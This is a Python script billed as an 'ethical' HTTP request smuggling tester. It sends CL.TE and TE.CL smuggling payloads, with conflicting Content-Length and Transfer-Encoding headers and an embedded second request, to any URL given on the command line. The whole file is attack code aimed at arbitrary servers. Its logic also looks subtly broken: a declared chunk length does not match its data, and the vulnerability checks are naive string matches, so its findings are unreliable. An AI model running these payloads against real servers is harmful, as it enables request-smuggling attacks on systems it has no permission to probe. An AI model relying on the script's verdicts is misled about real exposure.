import requests
import argparse
import time

def send_request(url, headers, body):
    try:
        response = requests.post(url, headers=headers, data=body, timeout=10)
        print(f"[INFO] Response Code: {response.status_code}")
        print(f"[INFO] Response Length: {len(response.content)}")
        return response
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Could not connect to the server: {e}")
        return None


def test_cl_te_smuggling(url):
    """
    Tests Content-Length vs. Transfer-Encoding vulnerability.
    """
    headers = {
        "Host": url.split("//")[-1],
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "4",
        "Transfer-Encoding": "chunked",
    }
    body = "0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 10\r\n\r\nsmuggle"

    print(f"\n[TEST] Testing CL.TE Smuggling on {url}")
    response = send_request(url, headers, body)
    if response and "HTTP/1.1" in response.text:
        print(f"[ALERT] Possible CL.TE vulnerability detected on {url}")
    else:
        print(f"[INFO] No CL.TE vulnerability detected on {url}")


def test_te_cl_smuggling(url):
    """
    Tests Transfer-Encoding vs. Content-Length vulnerability.
    """
    headers = {
        "Host": url.split("//")[-1],
        "Content-Type": "application/x-www-form-urlencoded",
        "Transfer-Encoding": "chunked",
    }
    body = "5\r\nsmuggle\r\n0\r\n\r\n"

    print(f"\n[TEST] Testing TE.CL Smuggling on {url}")
    response = send_request(url, headers, body)
    if response and "smuggle" in response.text:
        print(f"[ALERT] Possible TE.CL vulnerability detected on {url}")
    else:
        print(f"[INFO] No TE.CL vulnerability detected on {url}")


def main():
    parser = argparse.ArgumentParser(description="SPYDIRBYTE HTTP Request Smuggling Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://example.com)")
    parser.add_argument("-t", "--type", required=True, choices=["cl.te", "te.cl", "all"],
                        help="Type of test to perform: cl.te, te.cl, or all")
    args = parser.parse_args()

    url = args.url
    test_type = args.type

    if test_type == "cl.te":
        test_cl_te_smuggling(url)
    elif test_type == "te.cl":
        test_te_cl_smuggling(url)
    elif test_type == "all":
        test_cl_te_smuggling(url)
        time.sleep(2)
        test_te_cl_smuggling(url)
    else:
        print("[ERROR] Invalid test type specified!")


if __name__ == "__main__":
    print("""
    ************************************
        SPYDIRBYTE Smuggling Tool
       Ethical HTTP Request Testing
    ************************************
    """)
    main()
